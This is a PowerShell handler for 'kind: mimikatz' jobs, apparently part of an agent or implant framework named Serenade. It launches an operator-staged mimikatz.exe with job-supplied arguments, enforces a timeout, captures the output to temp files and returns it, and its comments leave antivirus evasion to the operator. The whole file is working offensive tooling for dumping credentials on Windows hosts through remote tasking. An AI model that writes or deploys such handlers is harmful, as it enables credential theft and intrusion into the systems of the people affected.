# Handler for `kind: mimikatz` jobs.
#
# Invokes the operator-staged mimikatz.exe with the supplied args. Captures
# stdout/stderr. Does NOT do any signature evasion — that's the operator's
# job (they staged the binary in C:\Serenade\tools\).

[CmdletBinding()]
param(
    [Parameter(Mandatory)] $Job,
    [Parameter(Mandatory)] [string]$ToolsDir
)

$exe = Join-Path $ToolsDir "mimikatz.exe"
if (-not (Test-Path $exe)) {
    return @{
        exit_code = -10
        stdout    = ""
        stderr    = "mimikatz.exe not found in $ToolsDir; operator must stage it"
    }
}

$argv = @()
foreach ($a in $Job.args) { $argv += [string]$a }

$timeoutSec = if ($Job.timeout_seconds) { [int]$Job.timeout_seconds } else { 120 }

$proc = Start-Process -FilePath $exe -ArgumentList $argv -NoNewWindow -PassThru `
    -RedirectStandardOutput "C:\Serenade\tmp\out.$($Job.job_id).txt" `
    -RedirectStandardError  "C:\Serenade\tmp\err.$($Job.job_id).txt"

if (-not $proc.WaitForExit($timeoutSec * 1000)) {
    try { $proc.Kill() } catch {}
    return @{
        exit_code = -3
        stdout    = ""
        stderr    = "timeout after $timeoutSec seconds"
    }
}

$out = Get-Content -Raw "C:\Serenade\tmp\out.$($Job.job_id).txt" -ErrorAction SilentlyContinue
$err = Get-Content -Raw "C:\Serenade\tmp\err.$($Job.job_id).txt" -ErrorAction SilentlyContinue
Remove-Item "C:\Serenade\tmp\out.$($Job.job_id).txt" -ErrorAction SilentlyContinue
Remove-Item "C:\Serenade\tmp\err.$($Job.job_id).txt" -ErrorAction SilentlyContinue

return @{
    exit_code = $proc.ExitCode
    stdout    = ($out ?? "")
    stderr    = ($err ?? "")
}
